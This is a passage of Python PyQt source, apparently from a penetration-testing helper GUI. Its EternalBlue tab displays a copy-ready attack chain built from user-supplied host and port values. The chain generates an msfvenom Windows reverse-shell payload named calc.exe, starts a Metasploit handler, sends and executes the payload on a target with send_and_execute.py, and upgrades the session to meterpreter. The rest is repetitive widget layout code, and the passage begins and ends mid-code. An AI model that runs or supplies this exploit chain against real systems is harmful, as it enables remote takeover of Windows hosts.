        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(43, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(44, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(45, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(46, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan3
        if hasattr(self, 'smbhelper_EternalBlue_Scan3'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan3)
            self.smbhelper_EternalBlue_Scan3.deleteLater()
        self.smbhelper_EternalBlue_Scan3 = QLabel("msfvenom -p windows/shell_reverse_tcp -f exe-service lhost=" + self.lhost + " lport=" + self.lport + " -o calc.exe")
        self.smbhelper_EternalBlue_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(47,self.smbhelper_EternalBlue_Scan3)
     
        # smbhelper_EternalBlue_Scan3_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan3_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan3_Copy)
            self.smbhelper_EternalBlue_Scan3_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan3_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan3_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan3.text()))
        self.smbhelper_EternalBlue_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan3_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan3)
        self.tab8_container_layout.insertLayout(48, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(49, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(50, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(51, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(52, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan4
        if hasattr(self, 'smbhelper_EternalBlue_Scan4'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan4)
            self.smbhelper_EternalBlue_Scan4.deleteLater()
        self.smbhelper_EternalBlue_Scan4 = QLabel("sudo msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/shell_reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";exploit\"")
        self.smbhelper_EternalBlue_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(53,self.smbhelper_EternalBlue_Scan4)
     
        # smbhelper_EternalBlue_Scan4_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan4_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan4_Copy)
            self.smbhelper_EternalBlue_Scan4_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan4_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan4_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan4.text()))
        self.smbhelper_EternalBlue_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan4_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan4)
        self.tab8_container_layout.insertLayout(54, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(55, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(56, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(57, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(58, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan5
        if hasattr(self, 'smbhelper_EternalBlue_Scan5'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan5)
            self.smbhelper_EternalBlue_Scan5.deleteLater()
        self.smbhelper_EternalBlue_Scan5 = QLabel("python2 send_and_execute.py " + self.rhost + " calc.exe")
        self.smbhelper_EternalBlue_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(59,self.smbhelper_EternalBlue_Scan5)
     
        # smbhelper_EternalBlue_Scan5_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan5_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan5_Copy)
            self.smbhelper_EternalBlue_Scan5_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan5_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan5_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan5.text()))
        self.smbhelper_EternalBlue_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan5_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan5)
        self.tab8_container_layout.insertLayout(60, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(61, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(62, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(63, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(64, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan6
        if hasattr(self, 'smbhelper_EternalBlue_Scan6'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan6)
            self.smbhelper_EternalBlue_Scan6.deleteLater()
        self.smbhelper_EternalBlue_Scan6 = QLabel("background")
        self.smbhelper_EternalBlue_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(65,self.smbhelper_EternalBlue_Scan6)
     
        # smbhelper_EternalBlue_Scan6_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan6_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan6_Copy)
            self.smbhelper_EternalBlue_Scan6_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan6_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan6_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan6.text()))
        self.smbhelper_EternalBlue_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan6_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan6)
        self.tab8_container_layout.insertLayout(66, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(67, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(68, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(69, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(70, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan7
        if hasattr(self, 'smbhelper_EternalBlue_Scan7'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan7)
            self.smbhelper_EternalBlue_Scan7.deleteLater()
        self.smbhelper_EternalBlue_Scan7 = QLabel("use post/multi/manage/shell_to_meterpreter")
        self.smbhelper_EternalBlue_Scan7.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(71,self.smbhelper_EternalBlue_Scan7)
     
        # smbhelper_EternalBlue_Scan7_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan7_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan7_Copy)
            self.smbhelper_EternalBlue_Scan7_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan7_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan7_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan7.text()))
        self.smbhelper_EternalBlue_Scan7_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan7 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan7_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan7)
        self.tab8_container_layout.insertLayout(72, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(73, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(74, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(75, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(76, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan8
        if hasattr(self, 'smbhelper_EternalBlue_Scan8'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan8)
            self.smbhelper_EternalBlue_Scan8.deleteLater()
        self.smbhelper_EternalBlue_Scan8 = QLabel("sessions -l")
        self.smbhelper_EternalBlue_Scan8.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(77,self.smbhelper_EternalBlue_Scan8)
     
        # smbhelper_EternalBlue_Scan8_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan8_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan8_Copy)
            self.smbhelper_EternalBlue_Scan8_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan8_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan8_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan8_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan8_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan8.text()))
        self.smbhelper_EternalBlue_Scan8_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan8 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan8_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan8)
        self.tab8_container_layout.insertLayout(78, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(79, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(80, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(81, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(82, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan9
        if hasattr(self, 'smbhelper_EternalBlue_Scan9'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan9)
            self.smbhelper_EternalBlue_Scan9.deleteLater()
        self.smbhelper_EternalBlue_Scan9 = QLabel("show options")
        self.smbhelper_EternalBlue_Scan9.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(83,self.smbhelper_EternalBlue_Scan9)
     
        # smbhelper_EternalBlue_Scan9_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan9_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan9_Copy)
            self.smbhelper_EternalBlue_Scan9_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan9_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan9_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan9_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan9_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan9.text()))
        self.smbhelper_EternalBlue_Scan9_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan9 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan9_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan9)
        self.tab8_container_layout.insertLayout(84, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(85, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(86, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(87, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(88, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan10
        if hasattr(self, 'smbhelper_EternalBlue_Scan10'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan10)
            self.smbhelper_EternalBlue_Scan10.deleteLater()
        self.smbhelper_EternalBlue_Scan10 = QLabel("set SESSIONS 1")
        self.smbhelper_EternalBlue_Scan10.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(89,self.smbhelper_EternalBlue_Scan10)
     
        # smbhelper_EternalBlue_Scan10_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan10_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan10_Copy)
            self.smbhelper_EternalBlue_Scan10_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan10_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan10_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan10_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan10_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan10.text()))
        self.smbhelper_EternalBlue_Scan10_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan10 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan10_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan10)
        self.tab8_container_layout.insertLayout(90, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
